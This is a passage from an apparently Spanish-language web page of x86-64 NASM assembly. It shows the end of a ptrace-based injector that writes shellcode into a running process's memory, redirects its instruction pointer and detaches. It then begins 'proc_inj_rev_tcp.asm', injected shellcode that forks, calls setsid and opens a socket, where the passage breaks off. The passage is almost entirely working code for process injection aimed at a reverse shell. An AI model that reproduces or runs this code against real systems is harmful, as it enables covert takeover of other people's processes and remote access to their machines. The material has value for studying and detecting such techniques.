</span><span id="__span-15-239"><a id="__codelineno-15-239" name="__codelineno-15-239" href="#__codelineno-15-239"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-15-240"><a id="__codelineno-15-240" name="__codelineno-15-240" href="#__codelineno-15-240"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-15-241"><a id="__codelineno-15-241" name="__codelineno-15-241" href="#__codelineno-15-241"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r13</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-15-242"><a id="__codelineno-15-242" name="__codelineno-15-242" href="#__codelineno-15-242"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-15-243"><a id="__codelineno-15-243" name="__codelineno-15-243" href="#__codelineno-15-243"></a>
</span><span id="__span-15-244"><a id="__codelineno-15-244" name="__codelineno-15-244" href="#__codelineno-15-244"></a><span class="w">        </span><span class="c1">; Comprobación de que se haya restaurado el bytearray de manera adecuada</span>
</span><span id="__span-15-245"><a id="__codelineno-15-245" name="__codelineno-15-245" href="#__codelineno-15-245"></a><span class="w">        </span><span class="c1">; PTRACE_PEEKDATA (leer memoria)</span>
</span><span id="__span-15-246"><a id="__codelineno-15-246" name="__codelineno-15-246" href="#__codelineno-15-246"></a><span class="w">        </span><span class="c1">;mov rax, 101</span>
</span><span id="__span-15-247"><a id="__codelineno-15-247" name="__codelineno-15-247" href="#__codelineno-15-247"></a><span class="w">        </span><span class="c1">;mov rdi, 2       ; PTRACE_PEEKDATA</span>
</span><span id="__span-15-248"><a id="__codelineno-15-248" name="__codelineno-15-248" href="#__codelineno-15-248"></a><span class="w">        </span><span class="c1">;mov rsi, r15     ; PID</span>
</span><span id="__span-15-249"><a id="__codelineno-15-249" name="__codelineno-15-249" href="#__codelineno-15-249"></a><span class="w">        </span><span class="c1">;mov rdx, r14     ; addr</span>
</span><span id="__span-15-250"><a id="__codelineno-15-250" name="__codelineno-15-250" href="#__codelineno-15-250"></a><span class="w">        </span><span class="c1">;sub rsp, 8</span>
</span><span id="__span-15-251"><a id="__codelineno-15-251" name="__codelineno-15-251" href="#__codelineno-15-251"></a><span class="w">        </span><span class="c1">;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-15-252"><a id="__codelineno-15-252" name="__codelineno-15-252" href="#__codelineno-15-252"></a><span class="w">        </span><span class="c1">;syscall </span>
</span><span id="__span-15-253"><a id="__codelineno-15-253" name="__codelineno-15-253" href="#__codelineno-15-253"></a>
</span><span id="__span-15-254"><a id="__codelineno-15-254" name="__codelineno-15-254" href="#__codelineno-15-254"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-255"><a id="__codelineno-15-255" name="__codelineno-15-255" href="#__codelineno-15-255"></a>
</span><span id="__span-15-256"><a id="__codelineno-15-256" name="__codelineno-15-256" href="#__codelineno-15-256"></a><span class="c1">; 8 Restauración de los registros originales del proceso tracee</span>
</span><span id="__span-15-257"><a id="__codelineno-15-257" name="__codelineno-15-257" href="#__codelineno-15-257"></a>
</span><span id="__span-15-258"><a id="__codelineno-15-258" name="__codelineno-15-258" href="#__codelineno-15-258"></a><span class="w">        </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-15-259"><a id="__codelineno-15-259" name="__codelineno-15-259" href="#__codelineno-15-259"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-260"><a id="__codelineno-15-260" name="__codelineno-15-260" href="#__codelineno-15-260"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-15-261"><a id="__codelineno-15-261" name="__codelineno-15-261" href="#__codelineno-15-261"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-15-262"><a id="__codelineno-15-262" name="__codelineno-15-262" href="#__codelineno-15-262"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-15-263"><a id="__codelineno-15-263" name="__codelineno-15-263" href="#__codelineno-15-263"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-15-264"><a id="__codelineno-15-264" name="__codelineno-15-264" href="#__codelineno-15-264"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-15-265"><a id="__codelineno-15-265" name="__codelineno-15-265" href="#__codelineno-15-265"></a>
</span><span id="__span-15-266"><a id="__codelineno-15-266" name="__codelineno-15-266" href="#__codelineno-15-266"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-267"><a id="__codelineno-15-267" name="__codelineno-15-267" href="#__codelineno-15-267"></a>
</span><span id="__span-15-268"><a id="__codelineno-15-268" name="__codelineno-15-268" href="#__codelineno-15-268"></a><span class="c1">; 9 Almacenamiento del RIP de retorno en los últimos 8 bytes de la región de memoria reservada por MMAP</span>
</span><span id="__span-15-269"><a id="__codelineno-15-269" name="__codelineno-15-269" href="#__codelineno-15-269"></a>
</span><span id="__span-15-270"><a id="__codelineno-15-270" name="__codelineno-15-270" href="#__codelineno-15-270"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-15-271"><a id="__codelineno-15-271" name="__codelineno-15-271" href="#__codelineno-15-271"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-272"><a id="__codelineno-15-272" name="__codelineno-15-272" href="#__codelineno-15-272"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-15-273"><a id="__codelineno-15-273" name="__codelineno-15-273" href="#__codelineno-15-273"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-15-274"><a id="__codelineno-15-274" name="__codelineno-15-274" href="#__codelineno-15-274"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r12</span><span class="o">+</span><span class="mi">4088</span><span class="p">]</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-15-275"><a id="__codelineno-15-275" name="__codelineno-15-275" href="#__codelineno-15-275"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-15-276"><a id="__codelineno-15-276" name="__codelineno-15-276" href="#__codelineno-15-276"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-15-277"><a id="__codelineno-15-277" name="__codelineno-15-277" href="#__codelineno-15-277"></a>
</span><span id="__span-15-278"><a id="__codelineno-15-278" name="__codelineno-15-278" href="#__codelineno-15-278"></a><span class="w">        </span><span class="c1">; Verificar que se ha escrito el valor del RIP de retorno en la región de memoria reservada por MMAP</span>
</span><span id="__span-15-279"><a id="__codelineno-15-279" name="__codelineno-15-279" href="#__codelineno-15-279"></a>
</span><span id="__span-15-280"><a id="__codelineno-15-280" name="__codelineno-15-280" href="#__codelineno-15-280"></a><span class="w">        </span><span class="c1">; PTRACE_PEEKDATA</span>
</span><span id="__span-15-281"><a id="__codelineno-15-281" name="__codelineno-15-281" href="#__codelineno-15-281"></a><span class="w">        </span><span class="c1">;mov rax, 101</span>
</span><span id="__span-15-282"><a id="__codelineno-15-282" name="__codelineno-15-282" href="#__codelineno-15-282"></a><span class="w">        </span><span class="c1">;mov rdi, 2       ; PTRACE_PEEKDATA</span>
</span><span id="__span-15-283"><a id="__codelineno-15-283" name="__codelineno-15-283" href="#__codelineno-15-283"></a><span class="w">        </span><span class="c1">;mov rsi, r15     ; PID</span>
</span><span id="__span-15-284"><a id="__codelineno-15-284" name="__codelineno-15-284" href="#__codelineno-15-284"></a><span class="w">        </span><span class="c1">;lea rdx, [r12+4088]     ; addr</span>
</span><span id="__span-15-285"><a id="__codelineno-15-285" name="__codelineno-15-285" href="#__codelineno-15-285"></a><span class="w">        </span><span class="c1">;sub rsp, 8       ; 8 bytes</span>
</span><span id="__span-15-286"><a id="__codelineno-15-286" name="__codelineno-15-286" href="#__codelineno-15-286"></a><span class="w">        </span><span class="c1">;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-15-287"><a id="__codelineno-15-287" name="__codelineno-15-287" href="#__codelineno-15-287"></a><span class="w">        </span><span class="c1">;syscall </span>
</span><span id="__span-15-288"><a id="__codelineno-15-288" name="__codelineno-15-288" href="#__codelineno-15-288"></a>
</span><span id="__span-15-289"><a id="__codelineno-15-289" name="__codelineno-15-289" href="#__codelineno-15-289"></a>
</span><span id="__span-15-290"><a id="__codelineno-15-290" name="__codelineno-15-290" href="#__codelineno-15-290"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-291"><a id="__codelineno-15-291" name="__codelineno-15-291" href="#__codelineno-15-291"></a>
</span><span id="__span-15-292"><a id="__codelineno-15-292" name="__codelineno-15-292" href="#__codelineno-15-292"></a><span class="c1">; 10 Inyección del shellcode en la zona de memoria reservada (PTRACE_POKEDATA escribe 8 bytes)</span>
</span><span id="__span-15-293"><a id="__codelineno-15-293" name="__codelineno-15-293" href="#__codelineno-15-293"></a>
</span><span id="__span-15-294"><a id="__codelineno-15-294" name="__codelineno-15-294" href="#__codelineno-15-294"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="nb">r13</span>
</span><span id="__span-15-295"><a id="__codelineno-15-295" name="__codelineno-15-295" href="#__codelineno-15-295"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">shellcode</span><span class="p">]</span><span class="w">   </span><span class="c1">; puntero al shellcode</span>
</span><span id="__span-15-296"><a id="__codelineno-15-296" name="__codelineno-15-296" href="#__codelineno-15-296"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-15-297"><a id="__codelineno-15-297" name="__codelineno-15-297" href="#__codelineno-15-297"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="nv">sc_len</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="w">        </span><span class="c1">; contador de palabras a escribir</span>
</span><span id="__span-15-298"><a id="__codelineno-15-298" name="__codelineno-15-298" href="#__codelineno-15-298"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r12</span>
</span><span id="__span-15-299"><a id="__codelineno-15-299" name="__codelineno-15-299" href="#__codelineno-15-299"></a>
</span><span id="__span-15-300"><a id="__codelineno-15-300" name="__codelineno-15-300" href="#__codelineno-15-300"></a><span class="w">    </span><span class="nl">.loop_inj:</span>
</span><span id="__span-15-301"><a id="__codelineno-15-301" name="__codelineno-15-301" href="#__codelineno-15-301"></a>
</span><span id="__span-15-302"><a id="__codelineno-15-302" name="__codelineno-15-302" href="#__codelineno-15-302"></a><span class="w">        </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">     </span><span class="c1">; compara el contador de palabras a escribir con 0</span>
</span><span id="__span-15-303"><a id="__codelineno-15-303" name="__codelineno-15-303" href="#__codelineno-15-303"></a><span class="w">        </span><span class="nf">jz</span><span class="w"> </span><span class="nv">.done</span><span class="w">       </span><span class="c1">; si contador == 0, saltar a .done</span>
</span><span id="__span-15-304"><a id="__codelineno-15-304" name="__codelineno-15-304" href="#__codelineno-15-304"></a>
</span><span id="__span-15-305"><a id="__codelineno-15-305" name="__codelineno-15-305" href="#__codelineno-15-305"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-15-306"><a id="__codelineno-15-306" name="__codelineno-15-306" href="#__codelineno-15-306"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-307"><a id="__codelineno-15-307" name="__codelineno-15-307" href="#__codelineno-15-307"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-15-308"><a id="__codelineno-15-308" name="__codelineno-15-308" href="#__codelineno-15-308"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-15-309"><a id="__codelineno-15-309" name="__codelineno-15-309" href="#__codelineno-15-309"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-15-310"><a id="__codelineno-15-310" name="__codelineno-15-310" href="#__codelineno-15-310"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r13</span><span class="p">]</span><span class="w"> </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-15-311"><a id="__codelineno-15-311" name="__codelineno-15-311" href="#__codelineno-15-311"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-15-312"><a id="__codelineno-15-312" name="__codelineno-15-312" href="#__codelineno-15-312"></a>
</span><span id="__span-15-313"><a id="__codelineno-15-313" name="__codelineno-15-313" href="#__codelineno-15-313"></a><span class="w">        </span><span class="nf">add</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-15-314"><a id="__codelineno-15-314" name="__codelineno-15-314" href="#__codelineno-15-314"></a><span class="w">        </span><span class="nf">add</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-15-315"><a id="__codelineno-15-315" name="__codelineno-15-315" href="#__codelineno-15-315"></a><span class="w">        </span><span class="nf">dec</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-15-316"><a id="__codelineno-15-316" name="__codelineno-15-316" href="#__codelineno-15-316"></a><span class="w">        </span><span class="nf">jmp</span><span class="w"> </span><span class="nv">.loop_inj</span>
</span><span id="__span-15-317"><a id="__codelineno-15-317" name="__codelineno-15-317" href="#__codelineno-15-317"></a>
</span><span id="__span-15-318"><a id="__codelineno-15-318" name="__codelineno-15-318" href="#__codelineno-15-318"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-15-319"><a id="__codelineno-15-319" name="__codelineno-15-319" href="#__codelineno-15-319"></a>
</span><span id="__span-15-320"><a id="__codelineno-15-320" name="__codelineno-15-320" href="#__codelineno-15-320"></a><span class="w">    </span><span class="nf">.done</span>
</span><span id="__span-15-321"><a id="__codelineno-15-321" name="__codelineno-15-321" href="#__codelineno-15-321"></a>
</span><span id="__span-15-322"><a id="__codelineno-15-322" name="__codelineno-15-322" href="#__codelineno-15-322"></a><span class="w">        </span><span class="c1">; Verificar que el shellcode se escribió bien</span>
</span><span id="__span-15-323"><a id="__codelineno-15-323" name="__codelineno-15-323" href="#__codelineno-15-323"></a><span class="w">        </span><span class="c1">;mov rax, 101</span>
</span><span id="__span-15-324"><a id="__codelineno-15-324" name="__codelineno-15-324" href="#__codelineno-15-324"></a><span class="w">        </span><span class="c1">;mov rdi, 2          ; PTRACE_PEEKDATA</span>
</span><span id="__span-15-325"><a id="__codelineno-15-325" name="__codelineno-15-325" href="#__codelineno-15-325"></a><span class="w">        </span><span class="c1">;mov rsi, r15</span>
</span><span id="__span-15-326"><a id="__codelineno-15-326" name="__codelineno-15-326" href="#__codelineno-15-326"></a><span class="w">        </span><span class="c1">;mov rdx, r12        ; dirección mmap</span>
</span><span id="__span-15-327"><a id="__codelineno-15-327" name="__codelineno-15-327" href="#__codelineno-15-327"></a><span class="w">        </span><span class="c1">;sub rsp, 8       ; 8 bytes</span>
</span><span id="__span-15-328"><a id="__codelineno-15-328" name="__codelineno-15-328" href="#__codelineno-15-328"></a><span class="w">        </span><span class="c1">;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-15-329"><a id="__codelineno-15-329" name="__codelineno-15-329" href="#__codelineno-15-329"></a><span class="w">        </span><span class="c1">;syscall </span>
</span><span id="__span-15-330"><a id="__codelineno-15-330" name="__codelineno-15-330" href="#__codelineno-15-330"></a>
</span><span id="__span-15-331"><a id="__codelineno-15-331" name="__codelineno-15-331" href="#__codelineno-15-331"></a><span class="w">        </span><span class="nf">pop</span><span class="w"> </span><span class="nb">r12</span>
</span><span id="__span-15-332"><a id="__codelineno-15-332" name="__codelineno-15-332" href="#__codelineno-15-332"></a>
</span><span id="__span-15-333"><a id="__codelineno-15-333" name="__codelineno-15-333" href="#__codelineno-15-333"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x80</span><span class="p">],</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; RIP == dirección del inicio de la memoria reservada == inicio del shellcode</span>
</span><span id="__span-15-334"><a id="__codelineno-15-334" name="__codelineno-15-334" href="#__codelineno-15-334"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x78</span><span class="p">],</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w">    </span><span class="c1">; orig_rax = -1 (evita syscall restart)</span>
</span><span id="__span-15-335"><a id="__codelineno-15-335" name="__codelineno-15-335" href="#__codelineno-15-335"></a>
</span><span id="__span-15-336"><a id="__codelineno-15-336" name="__codelineno-15-336" href="#__codelineno-15-336"></a><span class="w">        </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-15-337"><a id="__codelineno-15-337" name="__codelineno-15-337" href="#__codelineno-15-337"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-338"><a id="__codelineno-15-338" name="__codelineno-15-338" href="#__codelineno-15-338"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-15-339"><a id="__codelineno-15-339" name="__codelineno-15-339" href="#__codelineno-15-339"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-15-340"><a id="__codelineno-15-340" name="__codelineno-15-340" href="#__codelineno-15-340"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-15-341"><a id="__codelineno-15-341" name="__codelineno-15-341" href="#__codelineno-15-341"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-15-342"><a id="__codelineno-15-342" name="__codelineno-15-342" href="#__codelineno-15-342"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-15-343"><a id="__codelineno-15-343" name="__codelineno-15-343" href="#__codelineno-15-343"></a>
</span><span id="__span-15-344"><a id="__codelineno-15-344" name="__codelineno-15-344" href="#__codelineno-15-344"></a><span class="w">    </span><span class="c1">; PTRACE_DETACH</span>
</span><span id="__span-15-345"><a id="__codelineno-15-345" name="__codelineno-15-345" href="#__codelineno-15-345"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-346"><a id="__codelineno-15-346" name="__codelineno-15-346" href="#__codelineno-15-346"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">17</span><span class="w">    </span><span class="c1">; PTRACE_DETACH</span>
</span><span id="__span-15-347"><a id="__codelineno-15-347" name="__codelineno-15-347" href="#__codelineno-15-347"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-15-348"><a id="__codelineno-15-348" name="__codelineno-15-348" href="#__codelineno-15-348"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-15-349"><a id="__codelineno-15-349" name="__codelineno-15-349" href="#__codelineno-15-349"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">   </span><span class="c1">; signal = 0 (no enviar señal)</span>
</span><span id="__span-15-350"><a id="__codelineno-15-350" name="__codelineno-15-350" href="#__codelineno-15-350"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-15-351"><a id="__codelineno-15-351" name="__codelineno-15-351" href="#__codelineno-15-351"></a>
</span><span id="__span-15-352"><a id="__codelineno-15-352" name="__codelineno-15-352" href="#__codelineno-15-352"></a><span class="w">    </span><span class="c1">; EXIT</span>
</span><span id="__span-15-353"><a id="__codelineno-15-353" name="__codelineno-15-353" href="#__codelineno-15-353"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">60</span>
</span><span id="__span-15-354"><a id="__codelineno-15-354" name="__codelineno-15-354" href="#__codelineno-15-354"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="nb">rdi</span><span class="w"> </span>
</span><span id="__span-15-355"><a id="__codelineno-15-355" name="__codelineno-15-355" href="#__codelineno-15-355"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<h3 id="proc_inj_rev_tcpasm-shellcode"><code>proc_inj_rev_tcp.asm</code> (Shellcode)<a class="headerlink" href="#proc_inj_rev_tcpasm-shellcode" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="k">section</span><span class="w"> </span><span class="nv">.text</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="k">global</span><span class="w"> </span><span class="nv">_start</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="nl">_start:</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">    </span><span class="c1">; FORK</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">57</span>
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">           </span><span class="c1">; si rax==0 se trata del hijo</span>
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="w">    </span><span class="nf">jz</span><span class="w"> </span><span class="nv">.child</span><span class="w">            </span>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="w">                            </span><span class="c1">; r11 porque es un registro clobbered (destruido por las syscalls)</span>
</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="w">                                </span><span class="c1">; por tanto, no se está modificando un registro funcional del proceso tracee</span>
</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">_start</span><span class="p">]</span><span class="w"> </span><span class="c1">; r11 = dirección de _start = mmap_base = RIP inicial del shellcode</span>
</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>
</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="w">                            </span><span class="c1">; Nunca se debe asignar un valor a R11 antes de un syscall si se pretende recuperar después</span>
</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>
</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="w">    </span><span class="c1">; Proceso Padre</span>
</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r11</span><span class="o">+</span><span class="mi">4088</span><span class="p">]</span><span class="w"> </span><span class="c1">; Obtiene dirección de retorno</span>
</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="nb">r14</span><span class="w">             </span><span class="c1">; Salta a la dirección de retorno sobreescribiendo el registro RIP</span>
</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>
</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a><span class="nf">.child</span>
</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a>
</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a><span class="w">    </span><span class="c1">; SETSID</span>
</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">112</span>
</span><span id="__span-16-26"><a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-16-27"><a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a>
</span><span id="__span-16-28"><a id="__codelineno-16-28" name="__codelineno-16-28" href="#__codelineno-16-28"></a><span class="w">    </span><span class="c1">; SOCKET</span>
</span><span id="__span-16-29"><a id="__codelineno-16-29" name="__codelineno-16-29" href="#__codelineno-16-29"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">41</span>
